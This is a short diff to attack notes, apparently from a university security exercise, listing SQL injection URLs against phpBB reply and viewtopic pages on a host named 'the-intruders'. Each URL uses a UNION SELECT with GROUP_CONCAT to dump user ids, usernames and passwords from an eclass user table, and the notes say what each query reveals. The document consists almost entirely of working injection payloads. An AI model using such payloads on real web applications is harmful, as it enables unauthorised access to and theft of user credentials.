@@ -3,3 +3,7 @@ shows admins password
 
 http://the-intruders.csec.chatzi.org/modules/phpbb/reply.php?topic=4%20AND%201=2)%20UNION%20(select%201,2,3,GROUP_CONCAT(user_id,username,password)%20from%20eclass.user)%20--%20%20&forum=1
 shows user_idusernamepassword (concatenated, each user separated with comma)
+
+http://the-intruders.csec.chatzi.org/modules/phpbb/viewtopic.php?topic=4%20AND%201=2)%20UNION%20(SELECT%201,GROUP_CONCAT(password)%20FROM%20eclass.user)%20--%20&forum=1
+shows all passwords if GROUP_CONCAT(password)
+shows all user_ids if GROUP_CONCAT(user_id) klp
